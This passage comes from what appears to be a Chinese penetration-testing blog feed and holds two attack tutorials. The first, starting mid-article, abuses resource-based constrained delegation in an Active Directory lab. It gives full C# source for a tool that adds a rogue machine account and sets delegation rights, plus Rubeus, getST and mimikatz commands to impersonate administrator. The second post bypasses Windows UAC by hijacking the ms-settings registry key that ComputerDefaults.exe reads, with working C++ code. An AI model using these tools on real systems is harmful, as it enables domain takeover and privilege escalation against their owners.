横向拓展：在hack域中，addUser域用户负责将员工lm的机器或者web服务器web2008等机器加入到hack域里，那么当我们拿下addUser这个域用户的权限后，就可以拿下员工lm的机器和web服务器web2008。</p><p>环境模拟</p><pre><code>hack域角色            IP                    主机名                     服务器类型dc:         192.168.52.2        windows_server_2016_dc          windows2016web:        192.168.52.8        web2008                         windows2008pc:         192.168.52.30       win7-pc                         windows07domain user：    addUser     P@ssw0rd        加域账号</code></pre><p>web2008 和 win7-pc 是由addUser域用户(addUser不是域管)加入到域环境里成为域机器，但是addUser并不是web2008|win7-pc 域机器的本地管理组成员。</p><p>win7-pc域机器的信息：模拟内网里的员工电脑</p><ol><li><p>当前用户是lm域用户，但是lm域用户不是本地管理员成员。</p></li><li><p>由addUser域用户加入到域里，但是addUser域用户不是win7-pc域机器的本地管理组</p></li></ol><p><img src="/img/delegation/4c1cf92d-d0e9-4934-af7b-aa8f4c941342.png" alt="img"></p><p>web2008域机器的信息：模拟内网的web服务</p><ol><li>由addUser域用户加入到域里，但是addUser域用户不是web2008域机器的本地管理组</li></ol><p><img src="/img/delegation/8cc84979-fbf5-458b-9cc0-c44e97ffb712.png" alt="img"></p><h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02 利用："></a>0x02 利用：</h2><p>只要获取到加域账号就可以。</p><h3 id="0x02-1-寻找加域账号"><a href="#0x02-1-寻找加域账号" class="headerlink" title="0x02-1 寻找加域账号"></a>0x02-1 寻找加域账号</h3><pre><code>查询ACL：powerview的脚本，IdentityReference：域用户，ObjectDN：域机器，ActiveDirectoryRights：权限Get-ObjectAcl -ADSprefix &quot;CN=Computers&quot; |select IdentityReference,ObjectDN,ActiveDirectoryRights查询每个域机器是由哪个域用户添加进域的,通过mS-DS-CreatorSID查看域用户的sidAdFind.exe -h 192.168.52.2 -u lm -up Lm123*** -b &quot;DC=hack,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</code></pre><p><img src="/img/delegation/ba988274-ed8f-45ea-8e55-d4de3ea3b57c.png" alt="img"></p><p><img src="/img/delegation/e08d6cb2-30b6-4932-a1cc-11148660d453.png" alt="img"></p><pre><code>dn:CN=WEB2008,CN=Computers,DC=hack,DC=local&gt;mS-DS-CreatorSID: S-1-5-21-675002476-827761145-2127888524-1619sid2user.exe \\192.168.52.2 5 21 675002476 827761145 2127888524 1619Name is addUserDomain is HACKType of SID is SidTypeUser</code></pre><p>查WEB2008是由哪个域用户加入到域机器里的</p><p><img src="/img/delegation/068eed09-8d37-4579-a047-ed583f6b3fe1.png" alt="img"></p><p>此时找到了域里的加域账号addUser</p><h3 id="0x02-2-横向拓展"><a href="#0x02-2-横向拓展" class="headerlink" title="0x02-2 横向拓展"></a>0x02-2 横向拓展</h3><p>假设拿到了addUser用户，尝试和web2008建立ipc连接，发现并没有权限。</p><p><img src="/img/delegation/a90d3bbb-4568-48e7-9b43-9c4b27124437.png" alt="img"></p><p>使用addUser域用户添加一个域机器账户evilpc，机器账户的密码是123456，并且对web2008域机器配置msDS-AllowedToActOnBehalfOfOtherIdentity属性</p><pre><code>Addnew_MachineAccount.exe 域控IP 域的名字 域用户名 域用户密码 目标机器Addnew_MachineAccount.exe 192.168.52.2 hack.local addUser P@ssw0rd web2008</code></pre><p><img src="/img/delegation/ad8a188f-a8c5-414d-bdcf-ed3d42d46200.png" alt="img"></p><p><img src="/img/delegation/145fd8f2-7e80-4000-91ae-9f46e968c36f.png" alt="img"></p><p><img src="/img/delegation/99473ef7-2795-4101-8d78-8d7c458d88ae.png" alt="img"></p><p>使用impacket的getST生成票据，会在当前目录下生成administrator.ccache文件</p><p>目标机器安装impacket有点不现实，所以可以使用socks代理生成票据</p><pre><code>getST.py -dc-ip 192.168.52.2 hack.local/evilpc\$:123456 -spn cifs/web2008.hack.local -impersonate administrator</code></pre><p><img src="/img/delegation/8da00ed8-598a-44f7-bac1-01c95f402f10.png" alt="img"></p><p>使用mimikatz导入票据</p><pre><code>kerberos::ptc 票据kerberos::ptc C:\Users\lm\Desktop\administrator.ccache</code></pre><p><img src="/img/delegation/27454634-c24c-4ea5-86ca-62cc6ee44625.png" alt="img"></p><pre><code>klist           查询票据klist purge     清空票据</code></pre><p><img src="/img/delegation/568c02c8-3a1d-4953-8cfe-a8c769bd3eee.png" alt="img"></p><p>成功获取权限，切记，这里一定要是web2008.hack.local，只是web2008是没有权限的</p><p><img src="/img/delegation/7e7145a8-9dd9-4f01-9561-f663ba59835f.png" alt="img"></p><p>删除票据后，就没有权限了</p><p><img src="/img/delegation/2d9bf118-abaa-4b8d-9881-f820f96b5d2b.png" alt="img"></p><p>或者可以尝试用Rubeus生成票据，但是本地失败了。</p><p>计算域机器evilpc$的hash</p><pre><code>Rubeus.exe hash /user:evilpc$ /password:123456 /domain:hack.local</code></pre><p><img src="/img/delegation/f80b6fdf-3128-407b-b2f7-7df3ccf91c70.png" alt="img"></p><pre><code>Rubeus.exe s4u /user:evilpc$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/web2008 /pttRubeus.exe s4u /user:evilpc$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:host/web2008 /ptt</code></pre><p><img src="/img/delegation/15ab3eb5-a043-41af-9973-aad8dc74be25.png" alt="img"></p><p><img src="/img/delegation/667b5baa-1fe6-44f1-a3c9-b631c6c193c9.png" alt="img"></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><pre><code>https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSwhttps://xz.aliyun.com/t/7454#toc-1https://xz.aliyun.com/t/7217#toc-0https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/  查询aclhttps://www.cnblogs.com/simon7s/p/12370183.htm  mimikatz导入ccache票据</code></pre><h2 id="0x04-Addnew-MachineAccount-源码"><a href="#0x04-Addnew-MachineAccount-源码" class="headerlink" title="0x04 Addnew_MachineAccount 源码"></a>0x04 Addnew_MachineAccount 源码</h2><p>Addnew_MachineAccount.exe源码，使用C#编译</p><p><img src="/img/delegation/9e65d224-9857-4dd9-8d0a-787b96e3c5c1.png" alt="img"></p><p>添加对activedirecty操作的dll的引用</p><p><img src="/img/delegation/7b03aad5-a2d9-4619-8a80-412624cad08a.png" alt="img"></p><p>第十九行需要改一下，将DC=hack,DC=local改为内网对应的域</p><pre><code>using System;using System.Text;using System.Security.AccessControl;using System.Security.Principal;using System.Net;namespace Addnew_MachineAccount{    class Program    {        static void Main(string[] args)        {            String DomainController = args[0];  // 域控IP            String Domain = args[1];   // hack.local            String username = args[2]; //域用户名            String password = args[3]; //域用户密码            String victimcomputer = args[4]; //需要进行提权的机器            String new_MachineAccount = &quot;evilpc&quot;; //添加的机器账户            String new_MachineAccount_password = &quot;123456&quot;; //机器账户密码            String victimcomputer_ldap_path = &quot;LDAP://CN=&quot; + victimcomputer + &quot;, CN=Computers,DC=hack,DC=local&quot;; // 这里也需要改            String machine_account = new_MachineAccount;            String sam_account = machine_account + &quot;$&quot;;            String distinguished_name = &quot;&quot;;            String[] DC_array = null;            distinguished_name = &quot;CN=&quot; + machine_account + &quot;,CN=Computers&quot;;            DC_array = Domain.Split(&#39;.&#39;);            foreach (String DC in DC_array)            {                distinguished_name += &quot;,DC=&quot; + DC;            }            Console.WriteLine(&quot;[+] Elevate permissions on &quot; + victimcomputer);            Console.WriteLine(&quot;[+] Domain = &quot; + Domain);            Console.WriteLine(&quot;[+] Domain Controller = &quot; + DomainController);            //Console.WriteLine(&quot;[+] New SAMAccountName = &quot; + sam_account);            //Console.WriteLine(&quot;[+] Distinguished Name = &quot; + distinguished_name);            //连接ldap            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);            NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录            System.DirectoryServices.Protocols.LdapConnection connection = null;            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);            //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);            connection.SessionOptions.Sealing = true;            connection.SessionOptions.Signing = true;            connection.Bind();            var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;DnsHostName&quot;, machine_account +&quot;.&quot;+ Domain),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;SamAccountName&quot;, sam_account),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;userAccountControl&quot;, &quot;4096&quot;),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;unicodePwd&quot;, Encoding.Unicode.GetBytes(&quot;\&quot;&quot; + new_MachineAccount_password + &quot;\&quot;&quot;)),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;objectClass&quot;, &quot;Computer&quot;),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;ServicePrincipalName&quot;, &quot;HOST/&quot;+machine_account+&quot;.&quot;+Domain,&quot;RestrictedKrbHost/&quot;+machine_account+&quot;.&quot;+Domain,&quot;HOST/&quot;+machine_account,&quot;RestrictedKrbHost/&quot;+machine_account)            });            try            {                //添加机器账户                connection.SendRequest(request);                Console.WriteLine(&quot;[+] Machine account: &quot; + machine_account + &quot; Password: &quot; + new_MachineAccount_password + &quot; added&quot;);            }            catch (System.Exception ex)            {                Console.WriteLine(&quot;[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)&quot;);                Console.WriteLine(&quot;[-] Exception: &quot; + ex.Message);                return;            }            // 获取新计算机对象的SID            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, &quot;(&amp;(samAccountType=805306369)(|(name=&quot; + machine_account + &quot;)))&quot;, System.DirectoryServices.Protocols.SearchScope.Subtree, null);            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);            SecurityIdentifier sid = null;            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)            {                try                {                    sid = new SecurityIdentifier(entry.Attributes[&quot;objectsid&quot;][0] as byte[], 0);                    Console.Out.WriteLine(&quot;[+] &quot; + new_MachineAccount + &quot; SID : &quot; + sid.Value);                }                catch                {                    Console.WriteLine(&quot;[!] It was not possible to retrieve the SID.\nExiting...&quot;);                    return;                }            }            //设置资源约束委派            //System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(&quot;domain.com.cn&quot;);            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain, username, password);            myldapConnection.Path = victimcomputer_ldap_path;            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);            //通过ldap找计算机            search.Filter = &quot;(CN=&quot; + victimcomputer + &quot;)&quot;;            string[] requiredProperties = new string[] { &quot;samaccountname&quot; };            foreach (String property in requiredProperties)                search.PropertiesToLoad.Add(property);            System.DirectoryServices.SearchResult result = null;            try            {                result = search.FindOne();            }            catch (System.Exception ex)            {                Console.WriteLine(ex.Message + &quot;Exiting...&quot;);                return;            }            if (result != null)            {                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();                String sec_descriptor = &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&quot; + sid.Value + &quot;)&quot;;                System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);                byte[] descriptor_buffer = new byte[sd.BinaryLength];                sd.GetBinaryForm(descriptor_buffer, 0);                // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中                entryToUpdate.Properties[&quot;msds-allowedtoactonbehalfofotheridentity&quot;].Value = descriptor_buffer;                try                {                    entryToUpdate.CommitChanges();//提交更改                    Console.WriteLine(&quot;[+] Exploit successfully!&quot;);                }                catch (System.Exception ex)                {                    Console.WriteLine(ex.Message);                    Console.WriteLine(&quot;[!] \nFailed...&quot;);                    return;                }            }        }    }}</code></pre><h2 id="0x05-视频演示"><a href="#0x05-视频演示" class="headerlink" title="0x05 视频演示"></a>0x05 视频演示</h2><p><img src="/img/delegation/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基于资源的约束委派利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于白名单注册表bypassUAC</title>
      <link href="/2020/11/25/regeditbypassuac/"/>
      <url>/2020/11/25/regeditbypassuac/</url>
      
        <content type="html"><![CDATA[<h1 id="基于白名单注册表bypassUAC"><a href="#基于白名单注册表bypassUAC" class="headerlink" title="基于白名单注册表bypassUAC"></a>基于白名单注册表bypassUAC</h1><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p><p>当前用户是管理员权限，但是有些exe会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么也就没有成功运行该程序了。这样就会影响后续的内网渗透，例如取密码等，所以我们需要bypassuac。</p><p><img src="/img/regeditBypassUAC/1.jpg" alt></p><p><img src="/img/regeditBypassUAC/2.jpg" alt></p><p>手动bypassuac，右键以管理员身份运行，但是显然这个是不现实的</p><p><img src="/img/regeditBypassUAC/3.jpg" alt></p><h2 id="0x02-发掘bypassUAC的程序"><a href="#0x02-发掘bypassUAC的程序" class="headerlink" title="0x02 发掘bypassUAC的程序"></a>0x02 发掘bypassUAC的程序</h2><p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。 这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p><pre><code>1. 程序的manifest标识的配置属性 autoElevate为true2. 程序不弹出UAC弹窗3. 从注册表里查询Shell\Open\command键值对</code></pre><h3 id="0x02-1-寻找autoElevate为true的程序"><a href="#0x02-1-寻找autoElevate为true的程序" class="headerlink" title="0x02-1 寻找autoElevate为true的程序"></a>0x02-1 寻找autoElevate为true的程序</h3><p><img src="/img/regeditBypassUAC/4.jpg" alt></p><p>这里写了个py脚本遍历c:\windows\system32\目录下的所有exe文件，寻找autoElevate为true的exe程序</p><pre><code>import osfrom subprocess import *# path = r&#39;C:\Users\bingdu\Desktop\bypassUAC&#39;path = &#39;c:\windows\system32&#39;files = os.listdir(path)print(files)def GetFileList(path, fileList):    newDir = path    if os.path.isfile(path):        if path[-4:] == &#39;.exe&#39;:            fileList.append(path)    elif os.path.isdir(path):        try:            for s in os.listdir(path):                newDir=os.path.join(path,s)                GetFileList(newDir, fileList)        except Exception as e:            pass    return fileListfiles = GetFileList(path, [])      print(files)for eachFile in files:    if eachFile[-4:] == &#39;.exe&#39;:        command = r&#39;.\sigcheck64.exe -m {} | findstr auto&#39;.format(eachFile)        print(command)        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)        if &#39;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#39; in p1.stdout.read().decode(&#39;gb2312&#39;):            copy_command = r&#39;copy {} .\success&#39;.format(eachFile)            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)            print(&#39;[+] {}&#39;.format(eachFile))            with open(&#39;success.txt&#39;, &#39;at&#39;) as f:                f.writelines(&#39;{}\n&#39;.format(eachFile))</code></pre><p><img src="/img/regeditBypassUAC/5.jpg" alt></p><p>结果如下：</p><pre><code>c:\windows\system32\bthudtask.exec:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exec:\windows\system32\dccw.exec:\windows\system32\dcomcnfg.exec:\windows\system32\DeviceEject.exec:\windows\system32\DeviceProperties.exec:\windows\system32\djoin.exec:\windows\system32\easinvoker.exec:\windows\system32\EASPolicyManagerBrokerHost.exec:\windows\system32\eudcedit.exec:\windows\system32\eventvwr.exec:\windows\system32\fodhelper.exec:\windows\system32\fsquirt.exec:\windows\system32\FXSUNATD.exec:\windows\system32\immersivetpmvscmgrsvr.exec:\windows\system32\iscsicli.exec:\windows\system32\iscsicpl.exec:\windows\system32\lpksetup.exec:\windows\system32\MSchedExe.exec:\windows\system32\msconfig.exec:\windows\system32\msra.exec:\windows\system32\MultiDigiMon.exec:\windows\system32\newdev.exec:\windows\system32\odbcad32.exec:\windows\system32\PasswordOnWakeSettingFlyout.exec:\windows\system32\pwcreator.exec:\windows\system32\rdpshell.exec:\windows\system32\recdisc.exec:\windows\system32\rrinstaller.exec:\windows\system32\shrpubw.exec:\windows\system32\slui.exec:\windows\system32\Sysprep\sysprep.exec:\windows\system32\SystemPropertiesAdvanced.exec:\windows\system32\SystemPropertiesComputerName.exec:\windows\system32\SystemPropertiesDataExecutionPrevention.exec:\windows\system32\SystemPropertiesHardware.exec:\windows\system32\SystemPropertiesPerformance.exec:\windows\system32\SystemPropertiesProtection.exec:\windows\system32\SystemPropertiesRemote.exec:\windows\system32\SystemSettingsAdminFlows.exec:\windows\system32\SystemSettingsRemoveDevice.exec:\windows\system32\Taskmgr.exec:\windows\system32\tcmsetup.exec:\windows\system32\TpmInit.exec:\windows\system32\WindowsUpdateElevatedInstaller.exec:\windows\system32\WSReset.exec:\windows\system32\wusa.exe</code></pre><h3 id="0x02-2-寻找不弹UAC框的程序"><a href="#0x02-2-寻找不弹UAC框的程序" class="headerlink" title="0x02-2 寻找不弹UAC框的程序"></a>0x02-2 寻找不弹UAC框的程序</h3><p>在cmd一个个的去运行exe，如果不弹uac框就运行的既是</p><p>结果如下，下面只是找的前面几个，后面的没有去测试</p><pre><code>c:\windows\system32\bthudtask.exe                       okc:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exe                ok      1c:\windows\system32\dccw.exe                            ok      1c:\windows\system32\dcomcnfg.exe                        ok      1c:\windows\system32\DeviceEject.exe                     ok  c:\windows\system32\DeviceProperties.exe                okc:\windows\system32\djoin.exe                           okc:\windows\system32\easinvoker.exe                      okc:\windows\system32\EASPolicyManagerBrokerHost.exe      okc:\windows\system32\eudcedit.exe                        ok      1c:\windows\system32\eventvwr.exe                        ok      1c:\windows\system32\fodhelper.exe                       ok      1c:\windows\system32\fsquirt.exe                         ok      1c:\windows\system32\FXSUNATD.exe                        okc:\windows\system32\immersivetpmvscmgrsvr.exe           okc:\windows\system32\iscsicli.exe                        ok      1c:\windows\system32\iscsicpl.exe                        ok      1</code></pre><h3 id="0x02-3-从注册表里查询Shell-Open-command键值对"><a href="#0x02-3-从注册表里查询Shell-Open-command键值对" class="headerlink" title="0x02-3 从注册表里查询Shell\Open\command键值对"></a>0x02-3 从注册表里查询Shell\Open\command键值对</h3><p>通常以shell\open\command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。</p><p>所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p><p>使用Procmon监听，运行0x02-2的结果</p><p>这里以c:\windows\system32\ComputerDefaults.exe测试</p><p>过滤条件如下</p><p><img src="/img/regeditBypassUAC/6.jpg" alt></p><p>会去查询HKCU:\Software\Classes\ms-settings\shell\open\command</p><p><img src="/img/regeditBypassUAC/7.jpg" alt></p><p>然后我们再注册表里创建该键值对</p><p><img src="/img/regeditBypassUAC/8.jpg" alt><br>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，发现还查询了HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute的键值对</p><p><img src="/img/regeditBypassUAC/9.jpg" alt></p><p>在注册表里创建HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute</p><p><img src="/img/regeditBypassUAC/10.jpg" alt></p><p>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，这时候采取获取Software\Classes\ms-settings\shell\open\command的默认值，然后就会运行该值的程序</p><p><img src="/img/regeditBypassUAC/11.jpg" alt></p><h3 id="0x02-4-总结"><a href="#0x02-4-总结" class="headerlink" title="0x02-4 总结"></a>0x02-4 总结</h3><p>如果键值对HKCU:\Software\Classes\ms-settings\shell\open\command存在，ComputerDefaults会接下去查找HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute是否也存在,若也存在到则读取HKCU:\Software\Classes\ms-settings\shell\open\command的值然后执行。</p><p>测试：将HKCU:\Software\Classes\ms-settings\shell\open\command(default)的值设置为cmd.exe，然后运行c:\windows\system32\ComputerDefaults.exe</p><p><img src="/img/regeditBypassUAC/12.jpg" alt></p><p>成功弹出exe，并且是过了uac的权限</p><p><img src="/img/regeditBypassUAC/13.jpg" alt></p><h2 id="0x03-C-代码实现运行任意exe过uac"><a href="#0x03-C-代码实现运行任意exe过uac" class="headerlink" title="0x03 C++代码实现运行任意exe过uac"></a>0x03 C++代码实现运行任意exe过uac</h2><pre><code>#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int wmain(int argc, wchar_t* argv[]) {    if (argc != 2) {        wprintf(L&quot;Usage: %s &lt;filePath&gt;\n&quot;, argv[0]);        wprintf(L&quot;       %s cmd.exe\n&quot;, argv[0]);        exit(1);    }    LPWSTR filePath = argv[1];    PROCESS_INFORMATION pi = { 0 };    STARTUPINFOA si = { 0 };    HKEY hKey;    si.cb = sizeof(STARTUPINFO);    si.wShowWindow = SW_HIDE;    RegCreateKeyW(HKEY_CURRENT_USER, L&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;, &amp;hKey);       // 创建注册表项    RegSetValueExW(hKey, L&quot;&quot;, 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));                             // 赋值，执行的exe路径    RegSetValueExW(hKey, L&quot;DelegateExecute&quot;, 0, REG_SZ, (LPBYTE)&quot;&quot;, sizeof(&quot;&quot;));    // 创建进程ComputerDefaults    CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, (LPSTR)&quot;/c C:\\Windows\\System32\\ComputerDefaults.exe&quot;, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi);    // 延时十秒，等ComputerDefaults.exe运行    Sleep(10000);    // 清楚注册表项    RegDeleteTreeA(HKEY_CURRENT_USER, &quot;Software\\Classes\\ms-settings&quot;);    return 0;}</code></pre><p>效果：</p><p><img src="/img/regeditBypassUAC/14.jpg" alt></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><img src="/img/regeditBypassUAC/regeditBypassUAC.gif" alt></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper" target="_blank" rel="noopener">https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper</a></p>]]></content>
      
      
      <categories>
          
          <category> BypassUAC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BypassUAC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
